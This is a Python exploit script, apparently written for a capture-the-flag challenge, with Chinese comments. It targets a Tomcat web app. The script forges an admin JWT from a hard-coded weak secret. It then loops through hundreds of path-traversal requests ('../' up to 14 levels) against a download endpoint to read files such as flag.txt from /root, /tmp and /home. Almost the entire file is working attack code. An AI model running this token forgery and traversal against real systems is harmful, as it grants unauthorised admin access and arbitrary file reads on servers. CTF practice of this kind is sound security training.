#!/usr/bin/env python3
"""
最终方案：系统性搜索flag - 通过文件读取漏洞
不依赖RCE，只用文件读取
"""

import jwt
import requests

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token  
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

print("[+] 系统性搜索flag文件\n")
print("[*] 基于Tomcat部署路径: /usr/local/tomcat/webapps/ROOT\n")

# 从uploads目录出发，遍历可能的flag位置
search_matrix = []

# 生成搜索路径 - 从uploads向上和向外搜索
for up_levels in range(0, 15):
    prefix = "../" * up_levels
    for flag_name in ["flag", "flag.txt", "FLAG", "FLAG.txt", "flag.txt.bak", ".flag", "flag_is_here"]:
        search_matrix.append((prefix + flag_name, f"上{up_levels}级/{flag_name}"))
    
    # 也搜索常见目录
    for common_dir in ["root", "tmp", "home", "app", "opt", "var/www"]:
        for flag_name in ["flag", "flag.txt"]:
            search_matrix.append((prefix + common_dir + "/" + flag_name, f"上{up_levels}级/{common_dir}/{flag_name}"))

print(f"[*] 共生成 {len(search_matrix)} 个搜索路径\n")
print("[*] 开始搜索...\n")

found_flags = []

for i, (path, desc) in enumerate(search_matrix):
    if i % 50 == 0:
        print(f"  进度: {i}/{len(search_matrix)}")
    
    try:
        r = requests.get(
            f"{TARGET}/dashboard/download?path={path}",
            headers=headers,
            timeout=3
        )
        
        if r.status_code == 200:
            content = r.text
            
            # 过滤掉错误响应
            if "error" in content.lower():
                continue
            
            # 过滤空响应或HTML错误页
            if len(content) == 0 or content.startswith("<!"):
                continue
            
            # 看起来是有效内容
            if len(content) < 1000:  # flag通常不会很大
                print(f"\n[+] 找到文件: {desc}")
                print(f"    路径: {path}")
                print(f"    长度: {len(content)} 字节")
                print(f"    内容: {content}")
                
                # 检查是否看起来像flag
                if any(x in content.lower() for x in ["flag{", "pcb{", "ctf{", "flag", "pcb"]):
                    found_flags.append((path, content))
                    print(f"\n[!] 可能的FLAG: {content}\n")
    except:
        pass

print(f"\n\n[+] 搜索完成!")
print(f"[*] 共找到 {len(found_flags)} 个可能的flag文件\n")

for path, content in found_flags:
    print(f"路径: {path}")
    print(f"内容: {content}\n")
    print("="*80 + "\n")

if not found_flags:
    print("[!] 未找到flag。")
    print("\n[*] 可能的原因:")
    print("  1. Flag在数据库中而不是文件中")
    print("  2. Flag需要通过命令执行获取")
    print("  3. Flag文件名非常规")
    print("  4. 需要特殊权限才能读取")
